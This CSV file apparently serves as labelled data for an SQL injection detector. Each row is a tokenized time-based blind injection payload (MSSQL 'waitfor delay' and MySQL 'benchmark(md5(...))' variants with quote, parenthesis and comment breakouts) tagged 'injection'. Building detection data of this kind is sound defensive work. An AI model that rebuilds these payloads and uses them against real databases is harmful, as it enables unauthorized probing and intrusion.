88,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
89,RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
90,RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
91,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
92,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
93,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
94,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
95,CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
96,CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
97,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
98,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
99,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
100,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
101,RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
102,RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
103,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
104,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
105,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
106,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
0,waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
1,waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
2,SQUT waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
3,SQUT waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
4,DQUT waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
5,DQUT waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
6,RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
7,RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
8,RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
9,RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
10,RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
11,RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
12,RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
13,RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
14,RPRN RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
15,RPRN RPRN RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
16,SQUT RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
17,SQUT RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
18,DQUT RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
19,DQUT RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
20,SQUT RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
21,SQUT RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
22,DQUT RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
23,DQUT RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
24,SQUT RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
25,SQUT RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
26,DQUT RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
27,DQUT RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
28,SQUT RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
29,SQUT RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
30,DQUT RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
31,DQUT RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
32,SQUT RPRN RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
33,SQUT RPRN RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
34,DQUT RPRN RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
35,DQUT RPRN RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
36,SQUT RPRN RPRN RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
37,SQUT RPRN RPRN RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
38,DQUT RPRN RPRN RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
39,DQUT RPRN RPRN RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
0,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN RPRN PRCNT INT SLSH STAR,injection
1,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN RPRN PRCNT INT MINUS MINUS,injection
2,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN RPRN PRCNT INT PRCNT INT,injection
3,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN RPRN PRCNT INT SLSH STAR,injection
4,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN RPRN PRCNT INT MINUS MINUS,injection
5,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN RPRN PRCNT INT PRCNT INT,injection
6,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN RPRN PRCNT INT SLSH STAR,injection
7,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN RPRN PRCNT INT MINUS MINUS,injection
8,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN RPRN PRCNT INT PRCNT INT,injection
9,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL RPRN PRCNT INT SLSH STAR,injection
10,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
11,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL RPRN PRCNT INT PRCNT INT,injection
12,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL RPRN PRCNT INT SLSH STAR,injection
13,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
14,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL RPRN PRCNT INT PRCNT INT,injection
15,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL RPRN PRCNT INT SLSH STAR,injection
16,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
17,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL RPRN PRCNT INT PRCNT INT,injection
18,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
19,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
20,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
21,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
22,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
23,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
24,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
25,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
26,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
27,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
28,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
29,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
30,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
31,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
32,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
33,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
34,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
35,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
36,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
37,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
38,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
39,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
40,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
41,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
42,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
43,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
44,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
45,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
46,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
47,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
48,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
49,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
50,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
51,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
52,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
53,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
54,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
55,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
56,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
57,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
58,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
59,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
60,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
61,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
62,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
63,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
64,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
65,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
66,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
67,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
68,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
69,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
70,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
71,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
72,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
73,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
74,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
75,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
76,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
77,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
78,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
79,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
80,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
